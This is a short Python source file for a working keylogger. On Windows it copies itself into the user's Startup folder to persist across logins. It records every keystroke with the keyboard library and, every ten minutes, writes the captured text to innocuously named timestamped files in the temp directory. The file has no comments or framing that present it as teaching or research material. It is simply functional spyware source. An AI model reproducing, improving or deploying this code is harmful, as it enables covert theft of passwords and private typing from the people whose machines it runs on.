#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import keyboard
import tempfile
import shutil
import sys

from threading import Timer
from datetime import datetime


# Move this file in startup directory

if os.name == 'nt':
	startup_dir = f'{os.getenv("SystemDrive")}\\Users\\{str(os.getlogin()).strip()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
	if os.path.exists(startup_dir):
		current_file = sys.argv[0]
		shutil.move(current_file, startup_dir + '\\' + os.path.basename(__file__))


class KL(object):
	def __init__(self,
				interval = 600, # Default interval: 10 min
				directory = tempfile.gettempdir()):

		super(KL, self).__init__()
		self.temp_dir = directory
		self.interval = int(interval)
		self.temp_logs = ''


	def filter(self, event):
		event_name = event.name
		if len(event_name) > 1:
			if event_name == 'space':
				event_name = ' '
			elif event_name == 'shift':
				event_name = ''
			elif event_name == 'decimal':
				event_name = '.'
			elif event_name == 'enter':
				event_name = '[ENTER]\n'
			elif event_name == 'ctrl':
				event_name = ''
			elif event_name == 'backspace':
				event_name = '[DELETE]'
			else:
				event_name = ''
		self.temp_logs += event_name


	def update_filename(self):
		dt = datetime.now()
		self.filename = f'hello-{dt.day}-{dt.month}-{dt.year}_{dt.hour}-{dt.minute}-{dt.second}.txt'


	def start_listen(self):
		keyboard.on_release(callback=self.filter)
		self.send_data()
		keyboard.wait()


	def save_in_file(self):
		self.update_filename()
		with open(f'{self.temp_dir}\\{self.filename}', 'w') as log:
			print(self.temp_logs, file=log)
			log.close()


	def send_data(self):
		if self.temp_logs:
			self.save_in_file()
			self.temp_logs = ''
		
		timer = Timer(interval=self.interval, function=self.send_data)
		timer.daemon = True
		timer.start()


if __name__ == '__main__':
	logger = KL(interval=600)
	logger.start_listen()
